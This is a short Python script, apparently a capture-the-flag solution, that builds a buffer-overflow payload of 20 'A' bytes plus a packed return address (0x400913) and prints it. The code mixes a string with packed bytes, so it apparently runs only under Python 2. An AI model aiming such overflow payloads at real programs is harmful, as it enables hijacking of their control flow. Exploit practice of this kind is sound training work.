#from pwn import *
import os
import struct

#addr = p64(0x400913)
payload = "A"*20
payload += struct.pack("I", 0x400913)

print("%s" % payload)
